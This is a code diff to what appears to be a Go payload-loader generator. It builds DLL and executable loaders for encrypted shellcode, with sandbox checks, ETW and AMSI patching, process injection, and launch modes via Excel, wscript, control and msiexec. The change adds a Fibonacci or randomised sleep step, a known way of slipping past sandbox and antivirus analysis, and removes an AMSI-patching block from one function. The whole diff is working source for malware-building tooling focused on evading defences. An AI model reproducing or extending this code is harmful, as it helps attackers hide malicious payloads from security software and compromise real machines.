@@ -57,6 +57,9 @@ type Sandboxfunction struct {
 type Sandbox_DomainJoined struct {
 	Variables map[string]string
 }
+type Delayfunction struct {
+	Variables map[string]string
+}
 type HTALoader struct {
 	Variables map[string]string
 }
@@ -200,7 +203,7 @@ func WriteProcessMemory_Buff(number string, b64number int) (string, string, stri
 	return buffer.String(), WriteProcessMemory.Variables["decode"], WriteProcessMemory.Variables["WriteProcessMemory"]
 }
 
-func DLLfile(b64ciphertext string, b64key string, b64iv string, mode string, refresher bool, name string, sandbox bool, sandboxdomain string, ETW bool, ProcessInjection string, AMSI bool) (string, string, string) {
+func DLLfile(b64ciphertext string, b64key string, b64iv string, mode string, refresher bool, name string, sandbox bool, sandboxdomain string, ETW bool, ProcessInjection string, Sleep bool, SleepType string, AMSI bool) (string, string, string) {
 	var LoaderTemplate, DLLStructTemplate string
 	DLL := &DLL{}
 	DLL.Variables = make(map[string]string)
@@ -208,6 +211,8 @@ func DLLfile(b64ciphertext string, b64key string, b64iv string, mode string, ref
 	Sandboxfunction.Variables = make(map[string]string)
 	Sandbox_DomainJoined := &Sandbox_DomainJoined{}
 	Sandbox_DomainJoined.Variables = make(map[string]string)
+	Delayfunction := &Delayfunction{}
+	Delayfunction.Variables = make(map[string]string)
 	WindowsVersion := &WindowsVersion{}
 	WindowsVersion.Variables = make(map[string]string)
 	DLL.Variables["FuncName"] = Cryptor.CapLetter() + Cryptor.VarNumberLength(10, 19)
@@ -431,6 +436,48 @@ func DLLfile(b64ciphertext string, b64key string, b64iv string, mode string, ref
 		DLL.Variables["HEX_Import"] = ``
 	}
 
+	DLL.Variables["DelayFunctionName"] = Cryptor.VarNumberLength(10, 19)
+	DLL.Variables["Time_Import"] = `"time"`
+	if Sleep == false {
+		if SleepType == "fibonacci" {
+			DLL.Variables["DelayStep"] = "47"
+			DLL.Variables["Time_Import"] = ``
+			DelayFunctionTemplate, err := template.New("DelayFunction").Parse(Struct.SleepFib())
+			if err != nil {
+				log.Fatal(err)
+			}
+			if err := DelayFunctionTemplate.Execute(&buffer, DLL); err != nil {
+				log.Fatal(err)
+			}
+			DLL.Variables["DelayFunction"] = buffer.String()
+			buffer.Reset()
+		} else {
+			DLL.Variables["DelayStep"] = strconv.Itoa(Cryptor.GenerateNumer(2460, 3850))
+			fmt.Println("[+] Sleep Timer set for " + DLL.Variables["DelayStep"] + " milliseconds ")
+			DelayFunctionTemplate, err := template.New("DelayFunction").Parse(Struct.SleepTime())
+			if err != nil {
+				log.Fatal(err)
+			}
+			if err := DelayFunctionTemplate.Execute(&buffer, DLL); err != nil {
+				log.Fatal(err)
+			}
+			DLL.Variables["DelayFunction"] = buffer.String()
+			buffer.Reset()
+		}
+		
+	} else {
+		DLL.Variables["DelayStep"] = "0"
+		DelayFunctionTemplate, err := template.New("DelayFunction").Parse(Struct.SleepTime())
+		if err != nil {
+			log.Fatal(err)
+		}
+		if err := DelayFunctionTemplate.Execute(&buffer, DLL); err != nil {
+			log.Fatal(err)
+		}
+		DLL.Variables["DelayFunction"] = buffer.String()
+		buffer.Reset()
+	}
+
 	if refresher == false {
 		LoaderTemplate = Struct.WindowsVersion_Syscall()
 		DLLStructTemplate = Struct.DLL_Refresher()
@@ -490,7 +537,7 @@ func DLLfile(b64ciphertext string, b64key string, b64iv string, mode string, ref
 
 }
 
-func Binaryfile(b64ciphertext string, b64key string, b64iv string, mode string, console bool, sandbox bool, sandboxdomain string, name string, ETW bool, ProcessInjection string, Sleep bool, AMSI bool) (string, string, string) {
+func Binaryfile(b64ciphertext string, b64key string, b64iv string, mode string, console bool, sandbox bool, sandboxdomain string, name string, ETW bool, ProcessInjection string, Sleep bool, SleepType string, AMSI bool) (string, string, string) {
 	var Structure string
 	var buffer bytes.Buffer
 	Binary := &Binary{}
@@ -498,6 +545,8 @@ func Binaryfile(b64ciphertext string, b64key string, b64iv string, mode string, 
 	Sandboxfunction.Variables = make(map[string]string)
 	Sandbox_DomainJoined := &Sandbox_DomainJoined{}
 	Sandbox_DomainJoined.Variables = make(map[string]string)
+	Delayfunction := &Delayfunction{}
+	Delayfunction.Variables = make(map[string]string)
 	Binary.Variables = make(map[string]string)
 	WindowsVersion := &WindowsVersion{}
 	WindowsVersion.Variables = make(map[string]string)
@@ -832,21 +881,6 @@ func Binaryfile(b64ciphertext string, b64key string, b64iv string, mode string, 
 	} else {
 		Binary.Variables["HEX_Import"] = ``
 	}
-	if AMSI == false {
-		AMSI_Function, AMSI := AMSI_Buff(Binary.Variables["WriteProcessMemory"])
-		Binary.Variables["AMSI_Function"] = AMSI_Function
-		Binary.Variables["AMSI"] = AMSI + "()"
-
-	} else {
-		Binary.Variables["AMSI_Function"] = ""
-		Binary.Variables["AMSI"] = ""
-	}
-
-	if ETW == false || AMSI == false {
-		Binary.Variables["HEX_Import"] = `"encoding/hex"`
-	} else {
-		Binary.Variables["HEX_Import"] = ``
-	}
 
 	if ProcessInjection != "" {
 		ProcessInjection = strings.Replace(ProcessInjection, "\\", "\\\\", -1)
@@ -859,12 +893,47 @@ func Binaryfile(b64ciphertext string, b64key string, b64iv string, mode string, 
 	} else {
 		Structure = Struct.Binary()
 	}
-
+	
+	Binary.Variables["DelayFunctionName"] = Cryptor.VarNumberLength(10, 19)
+	Binary.Variables["Time_Import"] = `"time"`
 	if Sleep == false {
-		Binary.Variables["SleepSecond"] = strconv.Itoa(Cryptor.GenerateNumer(2220, 2900))
-		fmt.Println("[+] Sleep Timer set for " + Binary.Variables["SleepSecond"] + " milliseconds ")
+		if SleepType == "fibonacci" {
+			Binary.Variables["DelayStep"] = "47"
+			Binary.Variables["Time_Import"] = ``
+			DelayFunctionTemplate, err := template.New("DelayFunction").Parse(Struct.SleepFib())
+			if err != nil {
+				log.Fatal(err)
+			}
+			if err := DelayFunctionTemplate.Execute(&buffer, Binary); err != nil {
+				log.Fatal(err)
+			}
+			Binary.Variables["DelayFunction"] = buffer.String()
+			buffer.Reset()
+		} else {
+			Binary.Variables["DelayStep"] = strconv.Itoa(Cryptor.GenerateNumer(2220, 2900))
+			fmt.Println("[+] Sleep Timer set for " + Binary.Variables["DelayStep"] + " milliseconds ")
+			DelayFunctionTemplate, err := template.New("DelayFunction").Parse(Struct.SleepTime())
+			if err != nil {
+				log.Fatal(err)
+			}
+			if err := DelayFunctionTemplate.Execute(&buffer, Binary); err != nil {
+				log.Fatal(err)
+			}
+			Binary.Variables["DelayFunction"] = buffer.String()
+			buffer.Reset()
+		}
+		
 	} else {
-		Binary.Variables["SleepSecond"] = "0"
+		Binary.Variables["DelayStep"] = "0"
+		DelayFunctionTemplate, err := template.New("DelayFunction").Parse(Struct.SleepTime())
+		if err != nil {
+			log.Fatal(err)
+		}
+		if err := DelayFunctionTemplate.Execute(&buffer, Binary); err != nil {
+			log.Fatal(err)
+		}
+		Binary.Variables["DelayFunction"] = buffer.String()
+		buffer.Reset()
 	}
 
 	BinaryTemplate, err := template.New("Binary").Parse(Structure)
@@ -1134,7 +1203,7 @@ func Macro_Buff(URL string, outFile string) {
 	fmt.Println(buffer.String())
 }
 
-func CompileFile(b64ciphertext string, b64key string, b64iv string, mode string, outFile string, refresher bool, console bool, sandbox bool, sandboxdomain string, ETW bool, ProcessInjection string, sleep bool, AMSI bool) (string, string) {
+func CompileFile(b64ciphertext string, b64key string, b64iv string, mode string, outFile string, refresher bool, console bool, sandbox bool, sandboxdomain string, ETW bool, ProcessInjection string, sleep bool, sleeptype string, AMSI bool) (string, string) {
 	var code, FuncName, NTFuncName string
 	name, filename := FileName(mode)
 	if ETW == false {
@@ -1148,9 +1217,9 @@ func CompileFile(b64ciphertext string, b64key string, b64iv string, mode string,
 		fmt.Println("[*] Created Process: " + ProcessInjection)
 	}
 	if mode == "excel" || mode == "wscript" || mode == "control" || mode == "dll" || mode == "msiexec" {
-		code, FuncName, NTFuncName = DLLfile(b64ciphertext, b64key, b64iv, mode, refresher, name, sandbox, sandboxdomain, ETW, ProcessInjection, AMSI)
+		code, FuncName, NTFuncName = DLLfile(b64ciphertext, b64key, b64iv, mode, refresher, name, sandbox, sandboxdomain, ETW, ProcessInjection, sleep, sleeptype, AMSI)
 	} else {
-		code, FuncName, NTFuncName = Binaryfile(b64ciphertext, b64key, b64iv, mode, console, sandbox, sandboxdomain, name, ETW, ProcessInjection, sleep, AMSI)
+		code, FuncName, NTFuncName = Binaryfile(b64ciphertext, b64key, b64iv, mode, console, sandbox, sandboxdomain, name, ETW, ProcessInjection, sleep, sleeptype, AMSI)
 	}
 	os.MkdirAll(name, os.ModePerm)
 	Utils.Writefile(name+"/"+name+".go", code)
